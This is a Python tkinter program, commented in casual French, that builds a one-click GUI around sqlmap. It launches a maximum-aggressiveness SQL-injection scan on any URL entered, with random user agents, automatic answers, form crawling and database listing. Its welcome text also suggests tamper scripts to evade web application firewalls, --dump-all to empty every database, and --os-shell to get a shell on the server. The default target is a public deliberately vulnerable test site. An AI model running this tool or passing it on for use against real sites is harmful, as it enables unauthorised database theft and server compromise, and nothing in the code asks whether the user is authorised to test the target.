import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import messagebox
import subprocess
import threading
import os

def lancer_le_bazar():
    url = entry_url.get().strip()
    
    if not url:
        messagebox.showerror("Oups", "Met une URL fréro, j’vais pas deviner")
        return
    
   
    command = [
        "sqlmap.bat",                      
        "-u", url,
        "--batch",                          # répond oui à tout seul comme un grand
        "--random-agent",                   # change de navigateur à chaque requête
        "--risk=3",                         # on envoie du lourd
        "--level=5",                        # on teste même les trucs de ouf
        "--threads=10",                     # ça part en 0.1 seconde
        "--dbs",                            # si ça passe → on liste les bases direct
        "--forms",                          # il teste tous les formulaires tout seul
        "--crawl=3",                        # il va se balader un peu sur le site
        "--flush-session",                  # on repart de zéro à chaque fois
        "--output-dir=./sqlmap_output"      # tout est rangé dans ce dossier
    ]

    commande_complete = " ".join(command)
    

    text_output.insert("end", "Commande lancée :\n")
    text_output.insert("end", commande_complete + "\n")
    text_output.insert("end", "-" * 120 + "\n")
    text_output.see("end")

    def executer_sqlmap():
        try:
            proc = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
            )

            for ligne in proc.stdout:
                text_output.insert("end", ligne)
                text_output.see("end")
                root.update()

            text_output.insert("end", "\nScan terminé ! Check le dossier ./sqlmap_output\n")
            text_output.see("end")

        except FileNotFoundError:
            messagebox.showerror(
                "SUIS LE TUTO GROS NAZE",
                "sqlmap.bat introuvable !\n\n"
                "Solution rapide :\n"
                "1. Va dans ton dossier sqlmap\n"
                "2. Crée un fichier sqlmap.bat avec ça dedans :\n"
                '@echo off\npython "%~dp0sqlmap.py" %*'
            )

    
    threading.Thread(target=executer_sqlmap, daemon=True).start()


# ──────────────────────────────────────────────────────────────
# Interface ezz aker
# ──────────────────────────────────────────────────────────────
root = tk.Tk()
root.title("SQLMap Gui by oblivion alias le plus beau C: (tout est automatique mon coquinou ne tkt pas) ")
root.geometry("1100x750")
root.configure(bg="#121212")

style = ttk.Style()
style.theme_use("clam")
style.configure("TButton", padding=12, font=("Segoe UI", 10, "bold"))

top = tk.Frame(root, bg="#121212")
top.pack(pady=15, padx=20, fill="x")

tk.Label(top, text="URL à scanner :", font=("Consolas", 14, "bold"), bg="#121212", fg="#00ff41"
         ).pack(side="left")

entry_url = tk.Entry(top, font=("Consolas", 14), width=80, relief="flat", bg="#1e1e1e", fg="#00ff41", insertbackground="#00ff41")
entry_url.pack(side="left", padx=(10,0), fill="x", expand=True)
entry_url.insert(0, "http://testphp.vulnweb.com/listproducts.php?cat=1")

btn = ttk.Button(top, text="LANCER SQLMAP", command=lancer_le_bazar)
btn.pack(side="right", padx=(15,0))

text_output = scrolledtext.ScrolledText(
    root,
    font=("Consolas", 10),
    bg="#0d0d0d",
    fg="#00ff41",
    insertbackground="#00ff41",
    relief="flat",
    padx=10,
    pady=10
)
text_output.pack(fill="both", expand=True, padx=20, pady=(0,20))

message_accueil = """
COMMANDE QUI S'EXECUTE QUAND TU CLIQUES :

sqlmap.bat -u "URL" --batch --random-agent --risk=3 --level=5 --threads=10 --dbs --forms --crawl=3 --flush-session --output-dir=./sqlmap_output

CE QUE FAIT CHAQUE OPTION (pour que ton petit cerveau comprenne c:) :

-u                 → l’URL que tu veux tester
--batch            → il pose zéro question, il fait tout tout seul
--random-agent     → change de navigateur à chaque requête (WAF de base = perdus)
--risk=3          → on envoie même les payloads un peu vénères
--level=5          → il teste ABSOLUMENT tout (cookies, headers, etc.)
--threads=10       → ça va 10x plus vite
--dbs              → si ça passe, il liste direct les bases de données
--forms            → il trouve et teste tous les formulaires tout seul
--crawl=3          → il se balade dans le site pour trouver d’autres pages
--flush-session    → pas de cache, on recommence à zéro
--output-dir       → tout est sauvegardé proprement dans le dossier sqlmap_output

Astuces bonus si tu veux aller plus loin un jour :
--tamper=space2comment,randomcase   → pour passer les WAF chiants
--proxy=http://127.0.0.1:8080       → tout passe dans Burp
--dump-all                         → il vide TOUT
--os-shell                         → tu récupères un reverse shell si le serveur est mal configuré

"""
text_output.insert("end", message_accueil)
text_output.insert("end", "Prêt. Colle ton URL et clique sur ton clique gauche a un point ou tu va casser ta souris.\n")
text_output.insert("end", "="*130 + "\n")

root.mainloop()